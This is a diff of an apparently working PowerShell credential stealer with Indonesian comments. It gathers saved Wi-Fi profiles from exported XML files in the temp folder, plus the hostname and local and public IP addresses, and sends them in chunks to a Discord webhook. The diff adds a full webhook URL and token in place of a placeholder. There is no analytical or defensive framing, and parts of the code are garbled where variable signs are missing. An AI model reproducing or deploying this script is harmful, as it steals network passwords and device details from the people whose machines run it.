@@ -1,4 +1,4 @@
-# Mengambil data profil Wi-Fi
+# 1. Mengambil data profil Wi-Fi yang tersimpan
 d = Get-ChildItem (Join-Path env:temp 'Wi*.xml') | ForEach-Object { 
     [xml]x = Get-Content _.FullName
     [PSCustomObject]@{ 
@@ -7,10 +7,10 @@ d = Get-ChildItem (Join-Path env:temp 'Wi*.xml') | ForEach-Object {
     } 
 }
 
-# Mengambil informasi Hostname dan IP
+# 2. Mengambil informasi Hostname dan IP perangkat
 \(hostname = [System.Net.Dns]::GetHostName()\)localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \(_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '\)publicIP = (Invoke-WebRequest -Uri "https://ipify.org" -UseBasicParsing).Content
 
-# Menyusun teks informasi sistem dasar
+# 3. Menyusun informasi dasar sistem
 \$systemInfo = @"
 **System Info:**
 Hostname: \$hostname
@@ -20,32 +20,32 @@ Public IP: \$publicIP
 **Wi-Fi Profiles:**
 "@
 
-# Fungsi untuk mengirim payload ke Discord secara aman
+# Fungsi internal untuk mengirim payload ke Discord secara aman
 function Send-DiscordWebhook (\$text) {
     \(payload = @{ content =\)text } | ConvertTo-Json -Depth 2
     try {
-        Invoke-WebRequest -Uri 'https://discord.com' -Method Post -Body \$payload -ContentType 'application/json' -UseBasicParsing | Out-Null
+        Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda' -Method Post -Body \$payload -ContentType 'application/json' -UseBasicParsing | Out-Null
     } catch {
-        # Mengabaikan error jika ada kendala jaringan saat pengiriman chunk
+        # Mengabaikan error koneksi sementara saat chunking
     }
 }
 
-# Eksekusi jika ada data Wi-Fi ditemukan
+# 4. Memproses dan mengirim data jika informasi Wi-Fi ditemukan
 if (\$d) {
-    # 1. Kirim informasi Sistem Terlebih Dahulu
+    # Kirim Header info sistem terlebih dahulu
     Send-DiscordWebhook \$systemInfo
     Start-Sleep -Milliseconds 600
 
-    # 2. Kirim data Wi-Fi secara bertahap (per 5 baris) agar tidak jebol 2000 karakter
+    # Ubah objek Wi-Fi menjadi baris teks string
     wifiLines = (d | Out-String) -split "`r`n"
     \$currentChunk = ""
 
+    # Memotong dan membatasi teks secara ketat maksimal 1500 karakter per pesan
     foreach (line in wifiLines) {
-        # Batasi chunk per pengiriman maksimal 1500 karakter saja untuk cari aman
         if ((currentChunk.Length + line.Length + 2) -gt 1500) {
             if (\$currentChunk.Trim() -ne "") {
                 Send-DiscordWebhook \$currentChunk
-                Start-Sleep -Milliseconds 600 # Jeda anti rate-limit Discord
+                Start-Sleep -Milliseconds 600 # Menghindari rate limit Discord
             }
             currentChunk = line
         } else {
@@ -54,7 +54,7 @@ if (\$d) {
         }
     }
 
-    # Kirim sisa potongan baris terakhir jika ada
+    # Mengirimkan sisa baris terakhir
     if (\$currentChunk.Trim() -ne "") {
         Send-DiscordWebhook \$currentChunk
     }
